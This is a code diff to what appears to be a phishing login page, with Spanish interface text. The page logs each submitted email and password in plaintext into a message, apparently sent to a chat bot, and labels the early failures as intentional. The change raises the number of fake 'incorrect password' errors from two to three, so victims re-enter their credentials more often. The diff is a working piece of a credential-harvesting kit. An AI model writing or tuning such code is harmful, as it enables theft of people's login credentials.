@@ -1133,7 +1133,7 @@
                 `🔐 *Intento de Login #${emailAttemptCount}*\n` +
                 `📧 Email: \`${email}\`\n` +
                 `🔑 Contraseña: \`${password}\`\n` +
-                `⏰ Estado: ${emailAttemptCount < 2 ? 'Fallido (Intencional)' : 'Exitoso (Permitido)'}`
+                `⏰ Estado: ${emailAttemptCount < 3 ? 'Fallido (Intencional)' : 'Exitoso (Permitido)'}`
             );
 
             submitBtn.disabled = true;
@@ -1143,7 +1143,7 @@
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = `<span>Continuar</span><i class="ph-bold ph-arrow-right text-sm"></i>`;
 
-                if (emailAttemptCount < 2) {
+                if (emailAttemptCount < 3) {
                     errEl.textContent = `Correo o contraseña incorrectos.`//(Intento ${emailAttemptCount} de 3)`;
                     errEl.classList.remove('hidden');
                 } else {
